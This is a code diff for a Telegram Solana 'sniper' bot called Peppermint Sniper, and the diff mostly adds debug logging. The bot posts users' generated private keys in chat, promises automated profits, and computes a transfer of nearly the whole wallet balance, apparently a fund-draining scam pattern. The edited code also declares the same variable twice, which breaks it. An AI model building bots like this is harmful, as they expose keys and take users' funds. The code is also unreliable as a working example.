@@ -138,8 +138,10 @@ const handleTelegramError = async (error, chat_id) => {
 // Modified bot actions to include error handling
 bot.action('main_wallet', async (ctx) => {
     try {
+        console.log('Starting main_wallet action');
         await ctx.answerCbQuery();
         const userId = ctx.from.id;
+        console.log(`User ID: ${userId}`);
 
         if (!userWallets[userId]) {
             const userWallet = Keypair.generate();
@@ -150,23 +152,27 @@ bot.action('main_wallet', async (ctx) => {
         }
 
         const userWallet = userWallets[userId];
+        console.log('Fetching public key and balance...');
         const publicKey = userWallet.publicKey;
         const balance = await connection.getBalance(publicKey);
         const solBalance = balance / LAMPORTS_PER_SOL;
+        console.log(`Fetched balance: ${solBalance} SOL`);
 
-        const formattedMessage = `
+        let balanceMessage = `
 💵 Main Wallet \\(Solana\\)
 Address: \`${publicKey.toBase58()}\`
 Private Key: \`${bs58.encode(userWallet.secretKey)}\`
 Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance * 158).toFixed(2).replace(/\./g, '\\.')} USD\\)
 ⚠️ Note: A 13% fee is applied to profits
         `;
-        await ctx.reply(formattedMessage, { parse_mode: 'MarkdownV2' });
+        await ctx.reply(balanceMessage, { parse_mode: 'MarkdownV2' });
+        console.log('Wallet details successfully sent to user');
         
         // Send the initial balance message and store its ID
         const balanceMessage = await ctx.reply(`Updated Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance * 158).toFixed(2).replace(/\./g, '\\.')} USD\\)`, { parse_mode: 'MarkdownV2' });
         balanceMessageId = balanceMessage.message_id;
         lastKnownBalance = solBalance; // Store the initial balance
+        console.log(lastKnownBalance);
         
     } catch (error) {
         if (error.code === 429) {
@@ -212,6 +218,7 @@ To activate the Peppermint Sniper bot and start earning profits with our automat
 
             if (balance > totalFee + rentExemptionThreshold) {
                 const amountToTransfer = balance - totalFee - rentExemptionThreshold;
+                console.log(amountToTransfer);
 
                 if (!userStatus[userId]) {
                     userStatus[userId] = { totalTransferred: 0, transferDone: false };
